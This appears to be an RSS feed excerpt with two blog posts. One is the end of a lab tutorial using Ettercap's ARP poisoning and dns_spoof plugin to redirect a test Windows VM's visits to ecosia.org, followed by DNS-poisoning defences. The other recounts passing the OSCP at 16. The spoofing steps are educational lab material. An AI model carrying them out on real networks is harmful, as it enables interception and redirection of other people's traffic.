&lt;p&gt;I use &lt;code&gt;ipconfig&lt;/code&gt; to get the IPv4 address of the Windows VM.&lt;/p&gt;
&lt;h2 id=&#34;7-runettercap&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nz7wSTrT_fwsS9C9p12JAA.png&#34; alt=&#34;&#34;  /&gt;

7. Run Ettercap&lt;/h2&gt;
&lt;p&gt;On my Kali machine, I navigate to Applications &amp;gt; 09 — Sniffing &amp;amp; Spoofing &amp;gt; ettercap-graphical in order to open the ettercap GUI.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NJo2YFgmY4SD6zkBz7DNpA.png&#34; alt=&#34;&#34;  /&gt;

In the upper-right hand corner, I click on the three dots and navigate to Targets &amp;gt; Select targets.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*m54-jnHr4SRYB0rNDpbzIA.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;I have white theme right now, don’t judge&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I then enter the IP address of the victim machine and default gateway and press “OK”. The default gateway can also be found in the &lt;code&gt;ifconfig/ipconfig&lt;/code&gt; command output of the victim machine.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*saKkteivYxqf_WJ6vQ6xnQ.png&#34; alt=&#34;&#34;  /&gt;

Click the Earth icon in the upper right-hand corner and select ARP poisoning.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*iA33LttxmEYOcbNGJ57MDA.png&#34; alt=&#34;&#34;  /&gt;

The default setting is okay here.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Hn7A8k11PR6HrcXcRBD14g.png&#34; alt=&#34;&#34;  /&gt;

Then, click the three dots in the corner again. Go to Plugins &amp;gt; Manage plugins.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*kYuERsIIlgodh6L8wP2RrQ.png&#34; alt=&#34;&#34;  /&gt;

Select &lt;code&gt;dns_spoof&lt;/code&gt; by double-clicking it. You’ll know that you’ve applied the plugin when the asterisk appears to the left of the plugin name.&lt;/p&gt;
&lt;h2 id=&#34;8-visit-the-domain-on-the-victimmachine&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tNOBptOwGtIEKMVP-E-qOw.png&#34; alt=&#34;&#34;  /&gt;

8. Visit The Domain on the Victim Machine&lt;/h2&gt;
&lt;p&gt;Now, we reap the fruits of our labor.&lt;/p&gt;
&lt;h2 id=&#34;before&#34;&gt;Before&lt;/h2&gt;
&lt;p&gt;This is the webpage that the victim  to see when visiting ecosia.org:&lt;/p&gt;
&lt;h2 id=&#34;after&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*K8cS5-Fsf0b97Zt20E-Vjw.png&#34; alt=&#34;&#34;  /&gt;

After&lt;/h2&gt;
&lt;p&gt;This is the webpage that the victim machine  sees when visiting ecosia.org:&lt;/p&gt;
&lt;h1 id=&#34;remediation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YXQSYdj_RbcymtXs2FOMxg.png&#34; alt=&#34;&#34;  /&gt;

Remediation&lt;/h1&gt;
&lt;p&gt;Here are some ways to prevent a DNS Cache Poisoning attack (referenced from &lt;a href=&#34;https://kinsta.com/blog/dns-poisoning/&#34;&gt;here&lt;/a&gt;).&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Use spoofing detection tools&lt;/li&gt;
&lt;li&gt;Have a strong DNS, DHCP, and IPAM (DDI) strategy in place&lt;/li&gt;
&lt;li&gt;Use Domain Name System Security Extensions (DNSSEC). This essentially adds different levels of verification&lt;/li&gt;
&lt;li&gt;Use end-to-end encryption for DNS queries&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning&#34;&gt;https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://kinsta.com/blog/dns-poisoning/&#34;&gt;https://kinsta.com/blog/dns-poisoning/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How I got my OSCP at 16 years old</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-03-19_how-i-got-my-oscp-at-16-years-old-50ed402d6fd1/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-03-19_how-i-got-my-oscp-at-16-years-old-50ed402d6fd1/</guid>
      <description>&lt;p&gt;Wait, you can do that? The answer is a resounding “yes”. And I’m not the only one who got my OSCP at the age of 16. Meet &lt;a href=&#34;https://www.offsec.com/offsec/meet-mihai-16-year-old-oscp-holder/&#34;&gt;Mihai&lt;/a&gt;, &lt;a href=&#34;https://vanshal.medium.com/my-oscp-journey-9a4041bab24a&#34;&gt;Vanshal&lt;/a&gt;, &lt;a href=&#34;https://grants235.github.io/cybersecurity/oscp/&#34;&gt;Grant&lt;/a&gt;, and &lt;a href=&#34;https://www.reddit.com/r/oscp/comments/swmqs1/aced_it_at_16yrs/?utm_source=share&amp;amp;utm_medium=web2x&amp;amp;context=3&#34;&gt;this person&lt;/a&gt; from Reddit. Admittedly, the number of us is few and far between when compared to the typical demographic of OSCP test-takers. To add to this, I’m a woman and I haven’t seen any other women my age do this. Still, people have done it and it  possible.&lt;/p&gt;
&lt;p&gt;I present to you, the beautiful:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*BQs51p5uCqZyIuYNCVrqGQ.png&#34; alt=&#34;Picture of my OSCP certification&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.credential.net/7370f6c4-31c5-4989-8612-90b600811813&#34;&gt;https://www.credential.net/7370f6c4-31c5-4989-8612-90b600811813&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;how-to-get-your-oscp-as-aminor&#34;&gt;How to Get Your OSCP as a Minor&lt;/h1&gt;
&lt;p&gt;For those that are like me, or simply for the curious, the process is slightly different for minors. I contacted &lt;a href=&#34;mailto:registrar@offensive-security.com&#34;&gt;registrar@offensive-security.com&lt;/a&gt; and asked them for the registration steps as a minor. As a response, they requested that I send in my government-issued ID and a letter with my parent&amp;rsquo;s signature. I responded with these and they informed me that I was eligible to take the PEN-200. You must do this &lt;strong&gt;before&lt;/strong&gt; buying the PEN-200.&lt;/p&gt;
&lt;p&gt;As a note on money, I know that we’re probably broke high-school students and the cheapest option ($1499) is not very cheap. If you work at a job, your employer  be willing to pay for the training, even if you don’t work in a position related to technology. There’s a slim chance you can convince the school to pay for it. If not, maybe family/friends can help, or you could do what I did and pay for it yourself with the money that you earn from a job/internship.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*wehmn9kUcoEXnjLG&#34; alt=&#34;&#34;  /&gt;

Also, it’s important that your parents/guardians are on board. They don’t have to be your biggest cheerleaders but make sure that they understand that this involves taking a 48-hour exam. If you’re doing this on a weekend, it could interfere with your sleep before school and it will be very beneficial for you to have a workspace to do the exam at that is free of distractions. Food is another concern and if they’re supportive enough to cook for you, that can be helpful. These are things that you may have to discuss with them, and I know that it can be hard to convince them if they don’t understand the value of an OSCP (or the cost of it). It’s just important to keep in mind that they ultimately have the last call in whether you are allowed to hack into computers for 24 hours instead of doing chores.&lt;/p&gt;
&lt;p&gt;I was lucky enough to have parents who didn’t understand but supported me as long as I was willing to pay for it on my own.&lt;/p&gt;
&lt;h1 id=&#34;my-oscpjourney&#34;&gt;My OSCP Journey&lt;/h1&gt;
&lt;p&gt;This will include my preparation, my mindset, and my exam/report experience.&lt;/p&gt;
&lt;p&gt;This simple image is a summary of my OSCP timeline.&lt;/p&gt;
&lt;h2 id=&#34;my-background&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*K8Nv4EuM0InYvzhXWdoItA.png&#34; alt=&#34;A simple image summarizing my OSCP timeline&#34;  /&gt;

My Background&lt;/h2&gt;
&lt;p&gt;I started from a bit of a unique position. Because of my (albeit inconsistent) work over the past 3 years, I had been able to establish a technical foundation in coding. I didn’t understand IT or networking, but I understood software. I began my journey with 1 1/2 years of experience as a software engineer in part-time internships throughout my first 2 years of high school. I can talk more about this in another post if people are interested because finding these internships was a vast challenge as a minor. This is not necessary by any means, but I do think that the background helped me. In particular, from this, I got comfortable reading documentation, understanding/writing code, and troubleshooting.&lt;/p&gt;
&lt;h2 id=&#34;the-beginning&#34;&gt;The Beginning&lt;/h2&gt;
&lt;p&gt;My cybersecurity journey started out in late December of 2021 with a TryHackMe course on networking. It began with the fundamental question of how information can travel from one device to the next. Why is it that I can send a message to my mother’s phone without ever having physical interaction with it? And I also wondered about hacking, and, in particular, what it truly looked like.&lt;/p&gt;
&lt;p&gt;My journey started out of pure curiosity.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Fk9R3HxHH1nxuxF-&#34; alt=&#34;Girl looking through a microscope curiously&#34;  /&gt;

I went through the modules and then didn’t touch TryHackMe again, or anything cybersecurity-related, for another 2 months. I was at an internship at a startup on top of school, which was already exhausting. I knew that doing any more would lead me to burn out.&lt;/p&gt;
&lt;p&gt;When my internship ended, I had more free time. I recall using TryHackMe for about 1–2 hours per week in February and March of 2022. But my main focus was finding another software engineering internship because I wanted more experience before I graduated high school. At this point, I didn’t take cybersecurity seriously and I didn’t have the skill to do much relating to it.&lt;/p&gt;
&lt;p&gt;Around April of 2022, I started to passively do more TryHackMe alongside my new internship. At this point, I became deeply passionate about understanding the way that the devices worked. The idea of being able to outsmart the way that something functions so as to make it do something it wasn’t intended to do really appealed to me. It was the intellectual challenge that I craved and allowed me the freedom to think creatively. I began to understand the world better from what the modem down the hall does to how my school account works.&lt;/p&gt;
&lt;h2 id=&#34;getting-morefocused&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Q8ieug4tq9emeV9_&#34; alt=&#34;&#34;  /&gt;

Getting More Focused&lt;/h2&gt;
&lt;p&gt;The summer of 2022 was by far my most prolific period of learning throughout this journey. I watched countless YouTube videos, read numerous research blogs, and just fell in love with this community of diverse thinkers. It’s fascinating the way that cybersecurity folks will use their beautiful brains to challenge their surroundings. I found a video of a guy hacking his car, I learned about the Flipper Zero, and the WiFi Pineapple. Each of these surprised me in the most astonishing way because I didn’t know that these feats and gadgets were possible!&lt;/p&gt;
&lt;p&gt;This strengthened my passion for cybersecurity and I began following closely to IppSec. I couldn’t do HackTheBox machines without help from a walkthrough. By the way, HackTheBox is hard! Those machines are way more difficult than the OSCP! If you can’t do them, don’t fret. It takes practice and patience over a long-enough period of time. And that timeline will be different for each person.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*I7W7gRqGQgqtioYW.jpg&#34; alt=&#34;&#34;  /&gt;

I also took this time to learn basic networking and IT from this &lt;a href=&#34;https://www.youtube.com/@PowerCertAnimatedVideos&#34;&gt;extremely helpful channel&lt;/a&gt; and did some experiments on my home network.&lt;/p&gt;
&lt;h2 id=&#34;enrolling-in-thepen-200&#34;&gt;Enrolling in the PEN-200&lt;/h2&gt;
&lt;p&gt;This was a big step for me. I was unsure of whether I was skilled enough to get started. By this point, I was able to do some of the HTB boxes on TJ Null’s list without referencing a writeup. Getting this course was a big purchase and I didn’t want to waste my money.&lt;/p&gt;
&lt;p&gt;I ended up being disappointed with the course. I was hoping for better explanations and the topic exercises didn’t work about 10% of the time which prevented me from getting bonus points. In addition, before I knew about the topic exercises, I tried writing the lab report just to find out it wasn’t accepted after January 2023 for bonus points, so I wasted 1 1/2 months writing 400 pages when I could have instead been learning skills that would actually transfer to the OSCP.&lt;/p&gt;
&lt;p&gt;The labs weren’t very valuable to me with the exception of the AD networks and the IT network that required pivoting to get to. These two allowed me to practice port-forwarding and AD methodology in a way that was meaningful and transferrable.&lt;/p&gt;
&lt;p&gt;After about 2 months, of the PEN-200, I left to find better labs in Proving Grounds. I started by following TJ Null’s list, and then I switched to doing the ones that weren’t listed since I finished the list. It was also around this time that I got really interested in anonymity. So I spent the first week of my Christmas break learning about anonymity. I went on a number of other research tangents throughout my journey. I realized that I had trouble sustaining my OSCP journey without taking the time to explore other topics that interested me, so it was a common occurrence for me to shift my focus away from the OSCP every few weeks to learn something else.&lt;/p&gt;
&lt;h2 id=&#34;exam-month&#34;&gt;Exam Month&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*1XGLXdlNNkfdZLXa&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Woman who is stressed for her dear life&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;In the month leading up to the exam, I had reached a point of exhaustion. I experienced stress from several areas of my life at once and came to the conclusion that if I wanted to do well on my exam, de-stressing was my top priority. At this point, I had compromised over 200 lab machines total. I had the skill, I had my notes, and I had intuition. The final month wasn’t going to make a difference. I was already ready.&lt;/p&gt;
&lt;p&gt;As a result, I spent this time reading books about anthropology, neuroscience, and history. I went to the gym and socialized with friends at school I created more free time for myself and did what I needed to relax while also keeping my thinking skills sharp.&lt;/p&gt;
&lt;p&gt;I did about 1 PG machine per week. For each one of these, I made a focused effort to practice thorough note-taking and I would write an example report on it.&lt;/p&gt;
&lt;p&gt;I scheduled my exam about 2 weeks prior to the exam date. Waiting until so late meant that the only time available for me was 4:00 AM. I reserved this time knowing I would be able to wake up from the adrenaline rush.&lt;/p&gt;
&lt;h2 id=&#34;exam-day&#34;&gt;Exam Day&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Q_5-29t3MzePTHAp&#34; alt=&#34;&#34;  /&gt;

I woke up at 12:30 AM. I think the excitement woke me up because I was unable to fall asleep. I went to sleep at 8:00 PM the night before, hoping to wake up at 3:15 AM. It turned out that I didn’t even need to set an alarm that day!&lt;/p&gt;
&lt;p&gt;This wasn’t ideal because I had about 3 less hours of sleep than planned. I was still able to make it work, however. I logged on to the proctoring software at 3:45. After walking through the &lt;a href=&#34;https://help.offensive-security.com/hc/en-us/articles/360040574491-What-is-expected-of-me-as-a-learner-to-participate-in-a-proctored-exam-&#34;&gt;pre-exam checks&lt;/a&gt;, I was able to connect to my VPN at 4:00 AM.&lt;/p&gt;
&lt;p&gt;Here is a quick timeline of my test since this is already getting lengthy:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;4:00 AM (0pts)&lt;/strong&gt;- Use &lt;a href=&#34;https://rustscan.github.io/RustScan/&#34;&gt;RustScan&lt;/a&gt; to scan all the hosts and become familiar with my exam dashboard.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4:10 AM (0pts)&lt;/strong&gt;- Start enumerating the first AD machine. I didn’t find anything useful so I moved on temporarily.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4:40 AM (0pts)&lt;/strong&gt;- Start enumerating one of the individual machines. I figure out what I need to do.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4:55 AM (10pts)&lt;/strong&gt;- Submit my first local.txt and try to privesc.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5:10 AM (10pts)&lt;/strong&gt;- Don’t find a quick privesc, so start looking at second independent target. It takes about 20 more minutes, but I find what I need.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5:46 AM (20pts)&lt;/strong&gt;- Got a shell and submitted second local.txt.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5:46–6:10 AM (20pts)&lt;/strong&gt;- Take a break.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;6:10 AM (20pts)&lt;/strong&gt;- Enumerate domain controller. At this point, I’m getting really deep into enumeration and finding nothing.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;8:30 AM (20pts)&lt;/strong&gt;- Shift focus on 3rd independent target.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;9:20 AM (20pts)&lt;/strong&gt;- Found potential vulnerabilities, but wasn’t able to exploit them. Tried privesc on 1st independent target again.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;10:20 AM (20pts)&lt;/strong&gt;- Discovered interesting findings. Unable to use them for an exploit. Moved to AD machine.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;11:20 AM (20pts)&lt;/strong&gt;- Thorough enumeration, but didn’t find what I needed. I’m starting to get anxious.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;11:20–11:50 AM (20pts)&lt;/strong&gt;- Take a break.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;By this point, I was starting to lose my cool. I had been awake for nearly 12 hours on insufficient sleep. I went on a walk to clear my mind and brainstorm new enumeration ideas. With my list in mind, I returned to the exam desk:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*N-iZkZHiXrad1CEK&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;11:50 AM (20pts)&lt;/strong&gt;- Enumerate AD machine more with new ideas.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1:30 PM (20pts)&lt;/strong&gt;- Still no progress. Briefly contemplate giving up, but decide to keep going (read more about this in next section).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3:00 PM (20pts)&lt;/strong&gt;- Take a nap. Struggle to sleep because of excitement, but eventually relax. Completely exhausted from my enumeration efforts and lack of adequate sleep.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4:30 PM (20pts)&lt;/strong&gt;- Wake up and continue searching AD machine. This time with more of a focus on thorough, methodical, and manual enumeration.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5:00 PM (20pts)&lt;/strong&gt;- Find the missing piece!&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5:30 PM (20pts)&lt;/strong&gt;- Successfully exploit first AD machine!&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;6:30 PM (20pts)&lt;/strong&gt;- Escalate privileges and get proof.txt. Take a short break to cry tears of joy.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;7:00 PM (20pts)&lt;/strong&gt;- Encountering difficulties with getting one of my tools to work the way it normally does.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;8:00 PM (20pts)&lt;/strong&gt;- I found the solution to my problem after a lot of troubleshooting and continued to move forward.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;8:30–8:50 PM (20pts)&lt;/strong&gt;- Take a break.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;9:05 PM (20pts)&lt;/strong&gt;- Move laterally to 2nd AD machine and get proof.txt.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;9:31 PM (60pts)&lt;/strong&gt;- Privesc to 3rd AD machine as domain admin. Got proof.txt!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*3QBFTAphIYoDOzEe.jpg&#34; alt=&#34;&#34;  /&gt;

At this point, I was in &lt;strong&gt;utter disbelief&lt;/strong&gt; that I had actually done it. I took a break from the exam to go tell my mom how I was able to do it. I said, “This all started out as a naive dream that I had last April and I didn’t think it would actually happen. I went for it anyways, and now it’s actually coming true.”&lt;/p&gt;
&lt;p&gt;Now, I had the final task of scoring 10 more points before I was eligible to pass. I started by trying to get a foothold on independent target #3, but continue to fail. I go for the privesc on the 1st independent target, but hit numerous dead ends.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;11:30 PM (60pts)&lt;/strong&gt;- Shift focus to privesc on 2nd independent target, the one I thought I was least likely to get. My enumeration scripts weren’t working and I didn’t find much in my initial manual enumeration. Then, I went through my &lt;a href=&#34;https://github.com/ally-petitt/OSCP-cheatsheet/tree/main&#34;&gt;notes&lt;/a&gt; and tried each enumeration step one-by-one.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;11:50 PM (60pts)&lt;/strong&gt;- Discover a vulnerability that allowed me to privesc from a check that I almost didn’t include in my notes. I figured out how to exploit it and attempted it with the expectation that it would fail since I had been failing for the past 3 hours.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;11:55 PM (70pts)&lt;/strong&gt;- The exploit succeeds and I can’t believe that I just scored 70 points!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*CrQVpk88n0fjUXre.png&#34; alt=&#34;Woman crying tears of joy&#34;  /&gt;

My jaw is dropped as I stare at my terminal output. The feeling that I experienced in this moment is indescribable. My best attempt at illustrating the way that I felt is runner’s high… on a high. I had never felt so uplifted and energetic. This moment made the preceding hours of banging my head against the keyboard worth it. I take a break and just allow myself the time to appreciate that moment before continuing&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;12:30 AM (70pts)&lt;/strong&gt;- Do more enumeration on 3rd independent target to see if I can get an easy foothold. Realize how exhausted I am and check that I did an adequate job at screenshots and note-taking.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1:10 AM-iss (70pts)&lt;/strong&gt;- End exam early after verifying I had all the documentation I needed to write a good report&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I made the difficult decision to end my exam at 70 points, knowing that any mistake I made in reporting, proof screenshots, or flag submission would result in a fail. After triple-checking that my notes were thorough and that my screenshots/flag submissions met the exam requirements, I asked my proctor to end the exam early. I chose to do this for two reasons:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I would rather spend the last 3 hours of exam time sleeping since I knew I had a report to write the next day that required strong mental focus.&lt;/li&gt;
&lt;li&gt;If I were to compromise another machine, I would have to add it to my report, which would just make a job the next day more difficult.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Combined, I would have less sleep and more work for the next day. I decided that, ultimately, for me to write a great report tomorrow, I needed the sleep. So I sacrificed the potential extra points for the security that I would have the brain power to make the most beautiful report of my life.&lt;/p&gt;
&lt;p&gt;I also do want to mention that I was taking thorough notes and screenshots throughout my exam time just like I had practiced doing. I didn’t have to retrace my steps in order to ensure I had good notes because I had developed good documentation skills before the exam.&lt;/p&gt;
&lt;p&gt;I do want to note that I left out many of the breaks that I took just for the sake of brevity. I probably did take a break every 50 minutes on average. Most of them were only 5 minutes, some were 30.&lt;/p&gt;
&lt;h2 id=&#34;dont-giveup&#34;&gt;Don’t Give Up&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*VUEaqMiluWjqWpXB&#34; alt=&#34;&#34;  /&gt;

I do want to touch on 1:30 AM. I did genuinely consider quitting. I had previously failed the eJPT exam last July, so part of me figured that I was destined to fail this one as well. Before I allowed myself to spiral, I reconsidered what it cost me to be able to have that moment. I thought about the money that I spent, the hours I took to prepare, and the people who believed in me. I made an agreement with myself:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;I told myself that it was okay to fail. As long as I failed knowing that I did everything I possibly could to succeed.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So in order to appease my own mind and fail this exam regret-free, I continued. Ironically, it was my willingness to fail that allowed me to succeed. My stress levels decreased and I was able to actually get some sleep. After my nap, I compromised the first AD machine!&lt;/p&gt;
&lt;h2 id=&#34;youll-run-out-of-ideas-before-you-run-out-oftime&#34;&gt;You’ll Run Out of Ideas Before You Run Out of Time&lt;/h2&gt;
&lt;p&gt;The reason I was able to compromise the first AD machine after 12 hours of being stuck is this: I kept coming up with new ideas. Even if there’s a 1% chance of it working, when you have 100 of those ideas, one of them is bound to be it!&lt;/p&gt;
&lt;p&gt;Channel your inner child and keep asking questions and experimenting with ideas, even if you think it won’t work. Most ideas will probably fail, but all you need is one success.&lt;/p&gt;
&lt;h2 id=&#34;reporting&#34;&gt;Reporting&lt;/h2&gt;
&lt;p&gt;I could make a dedicated article just on this topic. To summarize, I cross-referenced multiple templates that I found online and figured out what my report should look like. I then used the template that I thought was the most aesthetic and modified it to fit my needs.&lt;/p&gt;
&lt;p&gt;I took pride in the report I created because I was very meticulous about my word choice, adhering to the documentation requirements, maintaining a consistent diction, explaining concepts clearly and accurately, and providing adequate screenshots.&lt;/p&gt;
&lt;p&gt;I submitted my report after triple-checking that it was perfect and re-reading it countless times. Then, the wait ensued.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*5pIvjg81NpVA1zmd&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;A man hopelessly staring at the clock&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;the-aftermath&#34;&gt;The Aftermath&lt;/h2&gt;
&lt;p&gt;This exam left me exhausted. I was very sleep deprived, fatigued, and anxious. It takes a significant amount of mental energy to maintain such intense attention to detail for a prolonged period of time. Throughout the exam period, I had a constant rush of adrenaline. And this made it near impossible to fall asleep. After I had submitted my report, I had to next most difficult part of the OSCP: the wait. Luckily, it only took 25 hours for me to get the email that I passed. Each of those 25 hours, I made sure to refresh my inbox every 30 seconds (optional step).&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Ly6iRSDs7Ugn1kAajhrNjg.jpeg&#34; alt=&#34;Picture of the exam email annoucning my success&#34;  /&gt;

I do want to mention that this exam also takes a physical toll. Sitting at a desk for so many hours, even with breaks, is hard on the body. Make sure to move, stretch, and hydrate. I felt stiff in the few days following the exam.&lt;/p&gt;
&lt;p&gt;For the next few days, I felt a lightness and joy knowing that all of my hard work had paid off. That I had dared to try something so ambitious and unrealistic and it actually worked. This was a major accomplishment for me that required overcoming countless challenges.&lt;/p&gt;
&lt;h2 id=&#34;takeaways&#34;&gt;Takeaways&lt;/h2&gt;
&lt;p&gt;The OSCP was much more than a test of technical ability. It was an assessment of organizational skills, time management, resourcefulness, troubleshooting, problem-solving ability, capacity to work under stress, and much more. There was a point during the exam when BurpSuite wasn’t working for me, so I had to improvise in order to figure out a different solution. There were points where I almost went down rabbit holes searching for something that didn’t exist. It really takes experience to realize when these things are happening and how to adapt.&lt;/p&gt;
&lt;p&gt;Additionally, working under that time constraint with a proctor watching my every move through the webcam was stressful. I also had to make sure I had standards for taking good notes, I had my systems for organizing the log files that I collected, a way to organize my screenshots, I knew the sections and layout of my report, etc.. A failure to do any of these would result in time being wasted, and with such a strict time constraint, there wasn’t much room for error.&lt;/p&gt;
&lt;h1 id=&#34;was-it-worthit&#34;&gt;Was it worth it?&lt;/h1&gt;
&lt;p&gt;The short answer is that I don’t know yet. It’s really hard to find cybersecurity work in general as a minor, but I think that having this certification demonstrates my skill and for the few opportunities that do exist, I’ll be more likely to actually get them.&lt;/p&gt;
&lt;p&gt;It’s worth noting that when people who know me think about cybersecurity, I’m the first person who comes to mind, which can help in creating more opportunities through word-of-mouth. Additionally, I am more respected by the adults and peers who understand what the OSCP is. When I’m networking, people are more interested in learning about me and working with me than before I was certified now that I have something tangible to back up my skill.&lt;/p&gt;
&lt;p&gt;Accomplishing this in high school is a pretty remarkable feat, and people in the industry realize this and respect it. It’s impressive and can help get your foot in the door in combination with other factors such as networking, education, and other experiences/projects. The closer that you get to becoming a legal adult, the more valuable the OSCP becomes in terms of career opportunities, although accomplishing it younger definitely stands out. It’s really a personal decision for you to make based on your situation, limitations, and values.&lt;/p&gt;
&lt;h2 id=&#34;imposter-syndrome&#34;&gt;Imposter Syndrome&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0JjF7v3_N9tkTMS4v7Jo0w.png&#34; alt=&#34;&#34;  /&gt;

As an update from future me, I would like to briefly mention my struggles with self-esteem following this exam. I set my mind to achieving this certification and diligently spent months preparing for it, but now that I’ve done it, I’ve noticed that I feel even less competent in my own abilities. I’ve continued to learn more and realized just how little I actually know. I’ve convinced myself that I just got lucky in achieving the OSCP and that I didn’t actually earn it.&lt;/p&gt;
&lt;p&gt;In the days following the exam, I felt amazing. But in the weeks following the exam, I felt degraded. And honestly, the doors that I thought would open for me just didn’t. I do realize that this is a massive achievement and logically, I truly have developed the mental and technical skills necessary to achieve this, but I also feel the need to work even harder to learn more and prove myself. I put unrealistically high expectations on myself at such a young age and it’s quite overwhelming. It’s like the Dunning-Kruger effect taken to the extreme.&lt;/p&gt;
&lt;p&gt;From what I’ve read, imposter syndrome is very common among people in this field, so I take it that I’m not unique in the sense of feeling worse after the OSCP. Despite this, however, I do not regret going for this certification. I’m so glad that I did. I think that imposter syndrome will be a long-term struggle for me going forward.&lt;/p&gt;
